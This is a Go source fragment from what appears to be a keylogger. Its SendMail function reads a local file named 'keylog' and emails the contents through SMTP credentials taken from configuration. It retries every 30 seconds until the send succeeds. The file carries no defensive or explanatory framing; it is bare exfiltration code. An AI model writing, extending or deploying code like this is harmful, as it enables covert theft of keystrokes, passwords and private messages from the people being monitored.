package main

import (
	"fmt"
	"log"
	"time"

	"gopkg.in/gomail.v2"
)

func SendMail() {
	dialer := gomail.NewDialer(conf.GetString("host_mail"),
		conf.GetInt("port_mail"),
		conf.GetString("user_mail"),
		conf.GetString("pass_mail"))
	message := gomail.NewMessage()
	message.SetHeader("From", conf.GetString("from_mail"))
	message.SetHeader("To", conf.GetString("to_mail"))
	message.SetHeader("Subject", fmt.Sprintf("%s %s",
		conf.GetString("subject_mail"), time.Now().Format(time.RFC1123Z)))
	message.SetBody("text", ReadLogFile("keylog"))
TryToSend:
	err := dialer.DialAndSend(message)
	if err != nil {
		log.Println(err)
		time.Sleep(30 * time.Second)
		goto TryToSend
	}
	log.Println("Send mail...")
}
